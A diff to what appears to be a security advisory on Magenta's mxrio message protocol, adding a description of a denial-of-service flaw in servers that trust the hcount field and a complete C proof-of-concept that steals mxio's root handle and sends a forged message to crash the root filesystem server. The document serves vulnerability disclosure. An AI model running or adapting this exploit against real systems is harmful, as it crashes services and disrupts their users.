@@ -36,7 +36,7 @@ from "txid" to "data[datalen]" are sent to the server as
 "bytes", and handles handle[0] to handle[hcount] are sent as 
 handles.  A typical write would look like:
 
-   mx_channel_write(server, 0, msg, MXRIO_HDR_SZ(msg) + msg->datalen,
+   mx_channel_write(server, 0, msg, MXRIO_HDR_SZ + msg->datalen,
                     msg->handle, msg->hcount);
 
 This operation sends the hcount and handle[] values twice -- once
@@ -119,4 +119,59 @@ If the server then performs an operation on the handle, such as
 closing the handle after an error is detected, the server would be 
 tricked into performing an unauthorized action.  Similar attacks
 could trick a srever into sending a message to the wrong server.
+
+A denial of service issue happens in code that trusts the hcount field:
+
+    // ensure handle count specified by opcode matches reality
+    if (msg->hcount != MXRIO_HC(msg->op)) {
+        for (unsigned i = 0; i < msg->hcount; i++) {
+            mx_handle_close(msg->handle[i]);
+        }
+        return ERR_IO;
+    }
+
+Since hcount can be arbitrary when receiving mxrio_msg_t messages
+in this manner, a large value can cause msg->handle[i] to read
+well beyond the message bounds. An attacker can take advantage of
+this to crash servers.
+
+EXAMPLE EXPLOIT:
+
+The following program will send a message that claims to have
+a large number of handles, but actually has none.  This will
+cause the root fileserver to attempt to close all of these handles,
+reading beyond the end of the stack and causing a crash.
+
+/*
+ * Crash the root filesystem server (devmgr).
+ */
+#include <stdio.h>
+#include <string.h>
+#include <magenta/syscalls.h>
+#include <mxio/remoteio.h>
+
+#include "private-remoteio.h" // stole a local copy of this file from mxio
+
+/* steal a copy of mxio's root handle for ourselves */
+mx_handle_t getRoot(void)
+{
+    mxrio_t *r = (mxrio_t*)mxio_root_handle;
+    return r->h;
+}
+
+int 
+main(int argc, char **argv)
+{
+    mxrio_msg_t msg;
+    memset(&msg, 0, sizeof msg);
+    msg.op = MXRIO_OPEN;    // wants 1 handle, we send zero
+    msg.hcount = 0xfffffff; // make server walk past end of memory
+    mx_handle_t root = getRoot();
+    mx_status_t x = mx_channel_write(root, 0, &msg, MXRIO_HDR_SZ, 0, 0); // send no handles
+    if(x != NO_ERROR) {
+        printf("channel write failed %x\n", x);
+        return 1;
+    }
+    return 0;
+}
 
